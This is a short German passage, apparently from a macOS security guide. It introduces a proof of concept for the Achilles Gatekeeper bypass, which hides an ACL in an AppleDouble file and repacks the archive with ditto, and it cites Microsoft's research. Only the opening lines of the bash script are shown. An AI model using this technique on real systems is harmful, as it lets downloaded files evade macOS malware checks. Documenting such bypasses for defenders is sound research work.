...
Der folgende Proof of Concept reproduziert die AppleDouble/ACL-Technik, die in der Forschung zum Achilles-Gatekeeper-Bypass verwendet wurde: Er serialisiert eine ACL als erweitertes Attribut, bewahrt sie in einer AppleDouble-Datei auf, benennt das Attribut in `com.apple.acl.text` um und erstellt das ZIP-Archiv mit `ditto` neu.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
rm -rf /tmp/test*
echo test >/tmp/test
...
- [1] [Microsoft Security Blog — Gatekeepers Achillesferse: Eine macOS-Schwachstelle aufgedeckt](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
